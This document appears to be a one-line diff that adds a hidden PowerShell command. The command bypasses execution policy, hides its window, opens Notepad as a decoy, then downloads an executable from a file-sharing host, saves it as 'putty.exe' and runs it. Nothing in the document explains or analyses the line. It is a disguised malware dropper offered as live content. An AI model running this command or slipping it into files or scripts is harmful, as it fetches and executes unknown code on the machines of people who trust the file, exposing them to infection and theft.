@@ -1,0 +1,1 @@
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command notepad.exe;(new-object System.Net.WebClient).DownloadFile('https://srv-store4.gofile.io/download/NpXlQs/yaesta.exe','putty.exe');./'putty.exe'
